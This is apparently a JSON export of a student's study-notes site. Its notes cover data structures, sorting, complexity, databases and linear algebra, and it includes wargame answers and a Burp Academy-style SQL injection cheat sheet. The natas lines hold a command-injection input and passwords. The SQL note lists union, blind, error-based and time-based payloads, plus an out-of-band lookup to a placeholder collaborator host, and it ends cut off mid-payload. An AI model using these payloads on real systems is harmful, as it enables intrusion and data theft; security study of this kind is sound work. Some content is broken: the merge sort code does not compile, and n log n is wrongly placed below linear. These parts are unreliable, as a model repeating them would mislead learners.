(W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl)\n-   **natas9**: `;cat /etc/natas_webpass/natas10; ls` (nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu)\n-   **natas10**: `-v test /etc/natas_webpass/natas11` (U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK)","aliases":null,"description":null},"/notes/Level-Lines":{"title":"Level Lines","date":"2022-01-19T01:40:59+01:00","description":null,"tags":["math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When dealing with multivariable functions, we project how the z axis looks at a certain value and draw it on the 2D plane. If we do that for multiple values of z, we get contours, just like maps."},"/notes/Binary-Tree":{"title":"Binary Tree","date":"2021-12-14T20:32:21+01:00","tags":["cs/data-structures","cs/trees"],"lastmodified":"2022-06-19T20:46:41.314596","content":"A binary [[/notes/Tree|Tree]] is a tree with a few extra constraints added on top:\n1. Every node can have *at most* 2 children\n2. Each child node is either left or right child.\n3. A left child precedes a right child in the order of the children of the parent.","aliases":null,"description":null},"/notes/Tree-Representation-With-Arrays":{"title":"Tree Representation with Arrays","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"It is very easy to represent [[/notes/Tree|Tree]]s using a linked data structures, similar to [[/notes/Linked List|Linked List]]. However, if you want more performance, it is sometimes better to use an [[/notes/Array|Array]]. It is easy to calculate the indexes of the parent([[/notes/Tree Terminology|Important Tree Terminology]]) and (left/right) children using simple arithmetic. If you place each node in an array as such:\n\n```mermaid\ngraph TD;\n\t0-->1 & 2;\n\t1-->3;\n```\n\nWe use the following formulas:\n* **parent** = $\\frac{i-1}{2}$\n* **left child** = $2i + 1$\n* **right child** = $2i + 2$","tags":null,"aliases":null,"description":null},"/notes/Big-Omega-Notation":{"title":"Big Omega Notation","date":"2021-11-16T21:07:41+01:00","tags":["cs/math","cs/analysis"],"lastmodified":"2022-06-19T20:46:41.314596","content":"The big omega notation $\\Omega(n)$ is basically the opposite of [[/notes/Big-Oh Notation|Big-Oh Notation]], what it does is that it shows the time an algorithm in the best-case relative to its input size, n. Here is how you calculate it:\n\n## Calculating Big-Omega\nSince big omega basically does what Big-Oh does, the definition is just slightly different, we still need two integers $c$ and $n_0$, but this time $f(n)$ must be greater than or equal to $c\\times g(n)$ for all $n > n_0$ in order for $f(n)$ to be $\\Omega(g(n))$. Here is the definition in predicate logic:\n\n  $$\\exists c,n_0(\\forall x(x \\geq n_0 g \\implies f(x) \\geq cg(x))) \\implies f(n) \\in \\Omega(g(n))$$","aliases":null,"description":null},"/notes/Merge-Sort":{"title":"Merge Sort","date":"2021-12-21T04:05:02+01:00","description":"A recursive sorting algorithm based on a divide and conquer approach.","tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Merge sort is a sorting algorithm based on a divide and conquer approach. Basically in merge-sort, a list is halved and sorted and then the sorted parts are then [[/notes/Merging in Merge Sort|merged]]. The halving operation is repeated until the halved list is of size 1 at this point, the recursion stops. In the end, drawing a graph of all the recursive calls gives us a complete binary tree [[/notes/Full & Complete Trees|Full vs Complete Binary Trees]]. \n\n## An example merge-sort implementation\n```java\npublic static int[] mergeSort(int[] list){\n\tif(list == null || list.length <= 1)\n\t\treturn list;\n\tint[] l1 = Arrays.copyOfRange(0, l1.length / 2, list);\n\tint[] l2 = Arrays.copyOfRange(l1.length / 2, l1.length, list);\n\tl1 = mergeSort(l1);\n\tl2 mergeSort(l2);\n\treturn merge(l1, l2);\n}\n```"},"/notes/7-Important-Functions":{"title":"7 Important Functions","date":"2021-11-16T21:07:41+01:00","tags":["math/analysis","cs/analysis"],"lastmodified":"2022-06-19T20:46:41.314596","content":"![7 Functions' Graphs](images/2809E595-B410-465A-B5E4-65486A4A3C40.jpeg)\n\nWhen calculating the [[/notes/Big-Oh Notation|Big-Oh Notation]] of a function it is important to know the order of these functions.\n\n## Constant function\nA very simple function in the form $f(n) = c$ where c is a constant. \n\n## The logarithm function\nThe logaritm function is $f(n) = log(n)$\n\n## The linear function\nThe linear function is, as you might have guessed a function increasing at a set rate. They are in the form $f(n) = an +b$. This function has a higher order than the logarithmic, and the N-log(N) functions.\n\n## The N-log(N) function\nThey are functions in the form $f(n) = n log(n)$. They have a higher order than *logarithmic* functions, but a smaller order than *linear* functions.\n\n## The quadratic function\nThese are basically a subset of polynomial time functions and are written in the form $f(n) = an^2 + bn + c$. They have the lowest order between the polynomials, but its order is higher than all the previous functions.\n\n## Polynomials\nPolynomials are basically functions that don\u2019t have any terms with a factor less than 0. A polynomial\u2019s degree is the term with the highest power in it. The higher a polynomial\u2019s degree is, the higher its order in the big-Oh notation.\n\n## The exponential function\nThese little fuckers are the worst of all, they are very slow, can be represented using formulas in the form $f(n) = a^n$ where $a \\in \\mathbb{Q}$.  They have the highest order between all the functions, and the order increases as a increases.","aliases":null,"description":null},"/notes/Update-Anomalies":{"title":"Update Anomalies","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.322597","content":"In a redundant database, when you need to update a certain value, you often need to update that value in all the tuples in your database. When doing so, there is a high chance that you might miss a tuple, causing an anomaly.","aliases":null,"description":null},"/notes/Identifying-Relationship":{"title":"Identifying Relationship","date":"2021-12-21T04:31:24+01:00","description":null,"tags":["cs/databases"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Identifying relationships are relationships that not only act as a connection between two [[/notes/Entity|Entity]]s, but also act as an identifier to an entity."},"/notes/Linear-Transformations":{"title":"Linear Transformations","date":"2022-02-26T01:34:45+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A transformation with domain $n$ and codomain $m$, which is made using an $n \\times m$ matrix, is represented by $\\mathbb{R}^n \\to \\mathbb{R}^m$.\n\n## Properties of matrix vector product\n\n^81460d\n\n- $T(u + v) = T(u) + T(v)$ \n- $T(cv) = cT(v)$ \n- $T(0) = 0$\n\n> If a [[/notes/Matrix Transformation|Matrix Transformation]] does not have these properties, it is not a linear transformation. \n\n<iframe height=\"500px\" width=\"100%\" src=\"https://prime-applets.ewi.tudelft.nl/apps/linear-algebra/transformations/\"></iframe>"},"/notes/Maps":{"title":"Maps","date":"2021-12-31T12:31:40+03:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Maps are data structures like [[/notes/Array|arrays]], they allow storing a set of elements in a single data structure and makes them accessible using *keys* instead if indexes. \n\n![[images/17FCF218-EA73-4242-90C2-2A148C25F2E0.jpeg]]"},"/notes/Multivariable-Function-as-Two-Functions":{"title":"Multivariable Function as Product of Two Functions","date":"2022-03-06T08:35:04+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"If you can write a [[/notes/Multivariable Functions|multivariable function]] as the product of two functions, one of which is defined by $x$ and the other $y$, [[/notes/Double Integrals Over Rectangles|integrating]] it becomes much easier. You can simply rewrite the function $f(x,y) = g(x)h(y)$ and so you can simply do the following operation:\n\n$$\n\\int_a^b\\int_c^df(x,y)dydx=\\int_a^bg(x)dx\\int_c^dh(y)dy\n$$"},"/notes/Bucket-Sort":{"title":"Bucket Sort","date":"2021-12-24T04:18:32+01:00","description":null,"tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Bucket sort is a non-comparison based sorting algorithm. It has the restriction that the integers in a list are in the range $[0, N]$. In order to sort the list, a list of $N+1$ elements are generated and each elements' value is used as an index into the array and the value of that index in the array is incremented. Once each element in the original array is visited, the counter array is then used to create a new, sorted array. This approach has the [[/notes/Big-Oh Notation|time complexity]] of $O(n)$ and space complexity of $O(n)$ as well."},"/notes/Empirical-Analysis":{"title":"Empirical Analysis","date":"2021-11-16T21:07:41+01:00","tags":["cs/algorithms","cs/analysis"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Empirical analysis is the process of running an algorithm with different input sizes and plotting/analyzin the change in input times overtime.\n\n## Drawbacks of empirical analysis\n- Runtime differs between different hardware, not just between different hardware but between different runs.\n- Does not cover all inputs, thus the inputs not tested are not covered by the empirical analysis.\n- An algorithm must be fully implemented in order to test it, but we only want to implement the fastest algorithm.\n\nInstead of doing empirical analysis, it is a good idea to first calculate the [[/notes/Big-Oh Notation|Big-Oh Complexity]]","aliases":null,"description":null},"/notes/Edge-List":{"title":"Edge List","date":"2022-01-23T02:59:28+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The edge list structure basically holds a list of all the edges in a [[/notes/Graphs|graph]] as well as a list of all the vertices. It is a simple yet effective way to store a graph. Since we store vertices and edges, it takes $O(n+m)$ space.^[1]:\n\n| **Method** | **Running Time** |\n|---------------|-------------------|\n| numVertices(), numEdges() | $O(1)$ |\n| vertices() | $O(n)$ |\n| edges() | $O(m)$ |\n| getEdge(u,v), outDegree(v), inDegree(v) | $O(m)$ |\n| insertVertex(x), insertEdge(u, v, x), removeEdge(e)| $O(1)$ |\n| removeVertex(v)| $O(m)$ |\n\n\n\n[1]: n is the number of vertices, m is the number of edges"},"/notes/Doubly-Linked-List":{"title":"Doubly Linked List","date":"2021-11-16T21:07:41+01:00","tags":["cs/data-structures","cs/lists"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Doubly linked list are very similar to [[/notes/Linked List|Linked List]] except that instead of having one pointer at each node, which points to the next node, each node has two pointers: one pointing to the next node and the other pointing to the previous node. The big-Oh notations for each operation remains the same. Except the operation of removing the tail node, since you can update the reference to the tail node, removing the tail takes $O(1)$ time.","aliases":null,"description":null},"/notes/Hash-Tables":{"title":"Hash Tables","date":"2021-12-31T12:57:08+03:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A hash table is a data structure in which every entry is mapped into an index in an [[/notes/Array|Array]] according to that entry's [[/notes/Hash Functions|hash value]]. Since a hash function might output value of a big-range, creating an array of that size may be undesirable. so the hash values are [[/notes/Hash Compression|compressed]]. This compression might lead to hash collision so [[/notes/Hash Collision Handling|Hash Collision Handling]] must be implemented."},"/notes/Convergent-Series":{"title":"Convergent Series","date":"2022-01-17T05:51:39+01:00","description":null,"tags":["math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A [[/notes/Series|Series]] can either converge or diverge, a divergent series basically goes to $\\infty$ as $k$ increases, while a convergent series approaches to constant value $c$. So basically, a series $S$ converges iff the limit $lim_{N\\to\\infty}S_N$ exists."},"/notes/First-Normal-Form":{"title":"1st Normal Form (1NF)","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"1st normal form is the simplest of the [[/notes/Normal Forms|Normal Forms]], it has no requirements for different types of functional dependencies. It only has two requirements:\n* That the relations in the schema must be flat.\n* That each attribute needs to be atomic, meaning it cannot be made up from multiple attributes. If you have a component with a cardinality more than one for instance, you can solve this by either replicating the tuple for each value of the attribute or by introducing a new relation instead of the attribute.","aliases":null,"description":null},"/notes/Deleting-From-A-Binary-Search-Tree":{"title":"Deleting  From A Binary Search Tree","date":"2022-01-01T03:08:29+01:00","description":null,"tags":["cs/algorithms","cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Deleting from a [[/notes/Binary Search Trees|binary search tree]] can be a tricky process since we want to sustain the BST property of the tree upon deletion. We can split the deletion of a node into three cases depending on how many children that node has.\n\n##  No Children\nJust remove the node.\n\n## One Child\nReplace the node with its child.\n\n## Two children\nIn this case, you have two choices:\n\n- Replace the node we want to delete with the maximum node in the left subtree\n- Replace it with the minimum node in the right subtree.\n\nAll these operations can be done in $O(log(n))$ time."},"/notes/Vector-Span":{"title":"Vector Span","date":"2022-02-22T06:29:52+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"The span of $n$ [[/notes/Vectors|Vectors]] is basically all the [[/notes/Linear Combinations|Linear Combinations]] of those vectors. And is written as:\n\n$$\nSpan{v_1, v_2, ..., v_3}\n$$"},"/notes/Inverse-Functions":{"title":"Inverse Functions","date":"2021-11-24T16:36:27+01:00","tags":["math/analysis"],"lastmodified":"2022-06-19T20:46:41.318597","content":"When writing an inverse function, you write the function in the form  $y = ...$ and interchange the xs and ys. And change the form of the equation such that y is alone in one side of the equation. This does not always apply for polynomials. In the case of second-order polynomials for example, you use the formulae $\\frac{-b \\pm \\sqrt{b^2-4ac}}{2a}$ . An  example of taking the inverse of the function $f(x) = x^2 - 4x + 7$ for $x \\ge 2$.\n\n$$y = x^2 - 4x + 7$$\n$$x = y^2 - 4y + 7$$\n$$0 = y^2 - 4y + 7 - x$$ \n$$a=1, b=-4, c=7-x$$\n$$y = \\frac{4 \\pm \\sqrt{16 - 4(7-x)}}{2}$$\n$$y = \\frac{4 \\pm 2\\sqrt{4 - 7+x}}{2}$$\n$$y = 2 \\pm \\sqrt{x-3}$$\nTwo possible options:\n$$y = 2 + \\sqrt{x-3}$$\n$$y = 2 - \\sqrt{x-3}$$\nSince when we take the inverse functions, we switch the domain and the range, we pick the function with the range $y \\ge 2$, so the first one. Therefore:\n\n$$f^{-1}(x) = 2 + \\sqrt{x-3}$$","aliases":null,"description":null},"/notes/Dijkstras-Algorithm":{"title":"Dijkstra's Algorithm","date":"2022-01-24T03:37:49+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Dijkstra's algorithm uses a [[/notes/Greedy Method|Greedy Method]] design pattern to find the shortest path from a start vertice $s$ to an end vertice $e$ in a directed and weigthed [[/notes/Graphs|graph]]. If the graph weren't weighted, we could simply use [[/notes/Breadth First Search|Breadth First Search]].\n\nIn Dijkstra' algorithm, a Cluster of vertices, $C$, a [[/notes/Priority Queue|Priority Queue]] (pq) and a [[/notes/Maps|map]] of $V \\to distance$ (D) is used. In the start, each vertice is assigned a distance of $\\infty$ except the start node, which is given a distance of $0$. The nodes are saved to pq using their distances as keys. Afterwards, the following algorithm is ran:\n\n```\nwhile(!pq.isEmpty())\n\tv = pq.removeMin()\n\tif D[v] == infty\n\t\tbreak\n\tfor u in v.getOutgoing():\n\t\tif D[u] > D[v] + weight(v,u):\n\t\t\tD[u] = D[v] + weight(v,u)\n\t\t\tpq.update(u, D[u]) // This part requires an Adaptable Priority queue, i.e. the keys can be updated\n```\n\nDijkstra runs in $O((n+m)logn)$ time or $O(n^2logn)$ time. Where n is the number of nodes and m is the number of edges."},"/notes/Null-Space":{"title":"Null Space","date":"2022-02-27T10:48:34+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The null space $Nul A$ of a matrix $m \\times n$ $A$ is the [[/notes/Subspace|Subspace]] that is generated by the [[/notes/Solutions of Linear Systems|solution of the linear system]] $Ax = 0$. The subspace is the subspace of $\\mathbb{R}^m$"},"/notes/ER-Diagram-Attributes":{"title":"ER Diagram Attributes","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases","cs/diagrams"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Attributes of an [[/notes/Entity|Entity]] can be represented in [[/notes/ER Diagrams|ER Diagrams]] using an ellipse connecting to an attribute. However, there other ways to do that as well.\n\n![[images/20211123104136.png]]\n\nIn this example, attributes are represented using circles. An empty circle has a cardinality of (1,1) which means that every entity must have that attribute and it can only have one of them. You can also specify the cardinality in the attribute, which is what was done in the Job attribute. Also, you can give an attribute with the cardinality of (N,1) using a circle in a circle.\n\nIt is also possible to create **composite attributes**, attributes that are made of smaller parts. One example to that is Date, which is made of day, month and year.\n\n![[images/20211123104817.png]]\n\nIn this notation, it is possible to also represent **derived attributes**, attributes which are made of/calculated from other attributes.\n\n![[images/20211123105108.png]]","aliases":null,"description":null},"/notes/Real-Matrixes-with-Complex-Eigenvalues":{"title":"Real Matrixes with Complex Eigenvalues","date":"2022-03-20T10:23:19+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Given a $2 \\times 2$ [[/notes/Matrixes|matrix]] in the form:\n\n$$\nA = \\begin{bmatrix}\na & -b \\\\\nb & a\n\\end{bmatrix}\n$$\n\n> This is a [[/notes/Rotational Transformations|rotational transformation]]\n\n\nThen $A$ has the eigenvalues $\\lambda_{\\pm}= a \\pm bi$ and can be represented by the [[/notes/Euler's Identity|Euler's Identity]] of\n\n$$\na + bi = re^{i\\phi}\n$$\n\n$$\nA = r\\begin{bmatrix}\ncos \\phi & -sin \\phi \\\\\nsin \\phi & cos \\phi\n\\end{bmatrix}\n$$\n\nDiagonalizing the matrix $B$, which has the eigenvalues : $a \\pm bi$ is calculated using the method below:\n\n$$\nB = P\\begin{bmatrix}\na & -b \\\\\nb & a\n\\end{bmatrix}\nP^{-1}\n$$\n\n$$\nP = \\begin{bmatrix}\nRe(\\mathbf{v}) & Im(\\mathbf{v})\n\\end{bmatrix}\n$$\n\nwhere $\\mathbb{v}$ is the eigenvector for $a - bi$"},"/notes/Not-NULL-Constraints":{"title":"Not NULL Constraints","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases","cs/theory"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Because of the fact that a relation is defined as $R \\subseteq D_1 \\times D_2 ... \\times D_n$, and a tuple(which represents a relation) cannot have empty elements, We assume that a special NULL value is part of every domain. When we don't want an element to be NULL, we give it the NOT NULL constraint. Keep in mind that [[/notes/Primary Key Constraints|Primary Key Constraints]] also automatically have NOT NULL constraints.","aliases":null,"description":null},"/notes/Hash-Compression":{"title":"Hash Compression","date":"2021-12-31T01:03:33+03:00","description":null,"tags":["cs/algorithms","cs/theory","cs/math"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"It can be very useful to compress a hash value so that it becomes smaller, there are some methods to achieve this:\n\n## The division method\nIn order to compress a hash i in the range $[0, N-1]$ you can simply calculate:\n\n$$\ni mod N\n$$\n\n## The MAD method\nMAD is more sophisticated then the division method since it eliminates repreated patters in a set of integers.\n\n$$\n[(ai+b) mod p] mod N\n$$\n\nWhere $p$ is a prime number greater than $N$ and $a$ and $b$ are randomly selected integers."},"/notes/Heap-Sort":{"title":"Heap Sort","date":"2021-12-21T02:54:31+01:00","description":null,"tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Heap sort is a faster version of [[/notes/Insertion Sort|Insertion Sort]], optimised by implementing a [[/notes/Heap|Heap]] into the [[/notes/Priority Queue|Priority Queue]] so that the insertion and removal stages take $O(nlog(n))$ time. The insertion stage can be altered to have an $O(n)$ complexity by using [[/notes/Bottom-Up Heap Construction|Bottom-Up Heap Construction]]. The $O(nlog(n))$ time complexity is much more efficient than the $O(n^2)$ for insertion and selection sort ([[/notes/7 Important Functions|7 Important Functions]])."},"/notes/Big-Theta-Notation":{"title":"Big-Theta Notation","date":"2021-11-16T21:07:41+01:00","tags":["cs/math","cs/analysis"],"lastmodified":"2022-06-19T20:46:41.314596","content":"![Big-Theta notation](images/Pastedimage20211112113644.png)\n\nBig theta notation is a little more complicated, the Big-Theta notation covers both the worst and best-case scenarios that an algorithm might have relative to its input (n). So it essentially is a combination of both [[/notes/Big-Oh Notation|Big-Oh Notation]] and [[/notes/Big-Omega Notation|Big Omega Notation]]. Since we are trying to cover two cases, the calculation is quite different:\n\n##  Calculating Big Theta\n\nA function $f(n)$ is said to be $\\Theta(g(n))$ if there exists constants $c' > 0$, $c'' > 0$  and $n_0 > 1$ such that:\n\n$$\\forall n (n > n_0 \\implies c'g(n) \\leq f(n) \\leq c''g(n))$$","aliases":null,"description":null},"/notes/Insertion-Sort":{"title":"Insertion Sort","date":"2021-12-21T01:51:28+01:00","description":null,"tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Insertion sort, is an algorithm based on [[/notes/Priority Queue|Priority Queue]]s. In insertion sort, you insert the elements that you want to sort into the priority queue in a **sorted** order. This operation takes $O(n)$ time for each insertsion(unless a [[/notes/Heap|Heap]] is used), and removing elements takes $O(1)$ time(again, unless the queue is implemented with a heap). In total, the big-oh complexity of this algorithm is $O(n^2)$\n\n![Image](images/DA3CF7B7-6332-41BA-86A5-34817A00DA6C.png)"},"/notes/Pre-Order-Traversal":{"title":"Pre-Order Tree Traversal","date":"2021-12-14T20:32:21+01:00","tags":["cs/algorithms","cs/trees"],"lastmodified":"2022-06-19T20:46:41.318597","content":"This is a method of depth first [[/notes/Tree Traversal|Tree Traversal]] in which we visit a node first and then visit its children, recursively. Thanks to its recursive nature, this allows for an easy-to-read, intuitive depth first traversal algorithm. \n\n![[images/Preorder-traversal.gif]]","aliases":null,"description":null},"/notes/SQL-Injection":{"title":"SQL Injection","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web","cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"SQL injection vulnerabilities occur when developers fail to properly sanitise the parameters in an SQL query that are provided by users. You can use SQLi to leak data or mess with an application\\'s logic.\n\n## Burp Academy Sections\n\n### Retrieving hidden data\n\nSay a web app runs the following SQL query when the value of the parameter *q* is %s:\n\n``` sql\nSELECT * FROM products WHERE category = '%s' AND released = 1\n```\n\nWhen a user sends the request with the parameter `?q=Gifts'`--= the server runs the SQL query:\n\n``` sql\nSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1\n```\n\nIf we want the server to return everything, we can send the request `?q=Gifts'+OR+1=1--`\n\n``` sql\nSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1\n```\n\n### Messing around with an app\\'s logic\n\nWhen a web application runs an SQL query when it tries log users in, it might use something like:\n\n``` sql\nSELECT * FROM users WHERE username = 'yeet' AND password = 'pass'\n```\n\nAn attacker can bypass such a mechanism by sending a request like `yeet'--` the app runs following SQL query:\n\n``` sql\nSELECT * FROM users WHERE username = 'yeet'--' AND password = 'pass'\n```\n\n### Getting data from other tables\n\nYou can use the operator to retrieve data from other tables. Here is an example for `?q=Gifts' UNION SELECT * FROM users--`\n\n``` sql\nSELECT * FROM users WHERE username = 'Gifts' UNION SELECT * FROM users--' AND password = 'pass'\n```\n\n### Examining the databse in cases of SQLi\n\nYou can use the *information~schema~.tables* to get a list of tables from the database ans `SELECT * FROM v$version` to get the database version\n\n### Blind SQL injection\n\nWhen you don\\'t see data being reflected to you, there still might be SQL injection vulnerabilities.\n\n## UNION Attacks\n\nThe [UNION](https:www.w3schools.com/sql/sql_union.asp) operator in SQL is used to combine/concatenate the results of two queries into one. For a UNION query to b valid, two conditions must be met:\n\n-   Both the queries must have the same number of columns\n-   The data types of each column must be compatible\n\nTherefore, to carry out a successful UNION based attack you must know how many columns are being returned by the database and which columns in the query have a suitable type with your injected query.\n\n### Determining the number of columns\n\nYou can use two methods to figure out the number of columns:\n\n1.  ORDER BY\n\n    You can make several order by queries and the number of columns that the query has is one less than the value of the `ORDER BY` query we ran. For instance if an app throws an error at `ORDER BY 6`, than it has 5 columns.\n\n2.  UNION\n\n    You can also use the UNION operator with *n* number of NULL fields. The application throws an error until the number of NULL fields in the `UNION SELECT` match exactly the number of columns in the original query.\n\n### Figuring out column types\n\nIn order to detect data types of columns, we can again use the UNION operator after determining the number of columns. You can use NULL fields and add a field of known type, checking for errors. If no errors occurs, than that column\\'s data type is that field. An example sequence of test requests could look like:\n\n    ' UNION SELECT 'a',NULL,NULL,NULL--\n    ' UNION SELECT NULL,'a',NULL,NULL--\n    ' UNION SELECT NULL,NULL,'a',NULL--\n    ' UNION SELECT NULL,NULL,NULL,'a'--\n\n### Retrieving Multiple Values in a Single Column in UNION Attacks\n\nYou can use concatenation techniques to combine two columns of data into one.\n\n## Blind SQL Injection\n\nSometimes SQL injection vulnerabilities might occur even if you don\\'t see the output of the queries you run. In those cases, it can be tested by using SLEEP operators, conditional responses and external service interaction.\n\n### Using Conditional Responses\n\nIn MySQL you can use SUBSTRING operator to compare a character at a certain point, for instance you can use the following SQL query to check whether the first char of password is less than k:\n\n``` sql\nSELECT * FROM sessions WHERE cookie='xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'-- AND username='yeet'\n```\n\nYou can also figure out the length of a response by using:\n\n``` sql\nSELECT * FROM sessions WHERE cookie='xyz' AND (SELECT 'a' FROM Users WHERE Username = 'Administrator' AND LENGTH(Password)>1)='a'-- AND username='yeet'\n```\n\nYou can use the Burp Suite\\'s *Cluster Bomb* attack type to exploit blind XSS.\n\n### Conditional Responses Using Errors\n\nIf the previous method doesn\\'t work, we can induce an error in the target system if an error a different response to be returned by the server. Here is an example\n\n``` sql\nSELECT * FROM sessions WHERE cookie='xyz' AND (SELECT CASE WHEN (SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a' WHEN Username = 'Administrator' -- AND username='yeet'\n```\n\nIf the first character is greater than 1, the SQL query tries to divide by 0 which throws an error. There are different methods and techniques you can use for each database type.\n\n### Using Time Delays\n\nIf a web application doesn\\'t reflect any indication about the query, we can still create conditionals time delays on the servers, and this can be used to leak information. When you use Burp Suite to exploit time-based blind XSS, you must force intruder to run in single-threaded mode.\n\n``` sql\nSELECT * FROM sessions WHERE cookie='xyz'; IF SELECT CASE WHEN (SUBSTRING(Password, 1, 1) > 'm') THEN sleep(10) ELSE sleep(0) END FROM Users WHEN Username = 'Administrator' -- AND username='yeet'\n```\n\nOf course, the techniques to trigger time delays may differ between different database types.\n\n### Blind SQL injection with Out-Of-Band techniques\n\nIn the cases where no info about the result of the output is reflected in the response and the server runs the query asynchronously, there is no way to detect whether your injection was successful. In those cases, you can trigger out-of-band network interactions with the query to test whether your injection was successful. Combining this interaction with conditions, you can leak data. The techniques to trigger such interactions change drastically depending on the type of database being used in the back-end server, you can find a list of database-specific payloads in [*DNS Data Exfiltration*]{.spurious-link target=\"DNS Data Exfiltration\"}\n\n## Second Order SQL injection\n\nSometimes a web application records data sent by a user and saves ot temporarily, afterwards, perhaps after a certain amount of time, it uses this user input without sanitizing it in an SQL Query. This is called a second order SQL injection and can be detected using [*Blind SQL injection with Out-Of-Band techniques*]{.spurious-link target=\"*Blind SQL injection with Out-Of-Band techniques\"}.\n\n## Tips & Tricks\n\n### String concatenation\n\n-   *Oracle* `'foo'||'bar'`\n-   *Microsoft* `'foo'+'bar'`\n-   *PostgreSQL* `'foo'||'bar'`\n-   *MySQL* `CONCAT('foo','bar')`\n\n### Substring\n\n-   *Oracle* `SUBSTR('foobar', 4, 2)`\n-   *Microsoft* `SUBSTRING('foobar', 4, 2)`\n-   *PostgreSQL* `SUBSTRING('foobar', 4, 2)`\n-   *MySQL* `SUBSTRING('foobar', 4, 2)`\n\n### Comments\n\n-   *Oracle* `--comment`\n-   *Microsoft* `--comment` `/*comment*/`\n-   *PostgreSQL* `--comment` `/*comment*/`\n-   *MySQL* `--[space]comment` `/*comment*/` `#comment`\n\n### Get Version\n\n-   *Oracle* `SELECT banner FROM v$version` OR `SELECT version FROM v$instance`\n-   *Microsoft* `SELECT @@version`\n-   *PostgreSQL* `SELECT version()`\n-   *MySQL* `SELECT @@version`\n\n### Database Content\n\n-   *Oracle* `SELECT * FROM all_tables` AND `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`\n-   *Microsoft* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`\n-   *PostgreSQL* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`\n-   *MySQL* `SELECT * FROM information_schema.tables` AND `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`\n\n### Conditional errors\n\n-   *Oracle* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`\n-   *Microsoft* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`\n-   *PostgreSQL* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`\n-   *MySQL* `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`\n\n### Stacking Queries\n\n-   *Oracle* `No support`\n-   *Microsoft,PostgreSQL,MySQL* `QUERY-1-HERE; QUERY-2-HERE`\n\n### Delays\n\n-   *Oracle* `dbms_pipe.receive_message(('a'),10)`\n-   *Microsoft* `WAITFOR DELAY '0:0:10'`\n-   *PostgreSQL* `SELECT pg_sleep(10)`\n-   *MySQL* `SELECT sleep(10)`\n\n### Conditional Delays\n\n-   *Oracle* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`\n-   *Microsoft* `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`\n-   *PostgreSQL* `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`\n-   *MySQL* `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`\n\n### DNS Lookup\n\n-   *Oracle*\n\n``` sql\nSELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"> %remote;]>'),'/l') FROM dual\n```\n\nOR\n\n``` sql\nSELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')\n```\n\n-   *Microsoft* `exec master..xp_dirtree 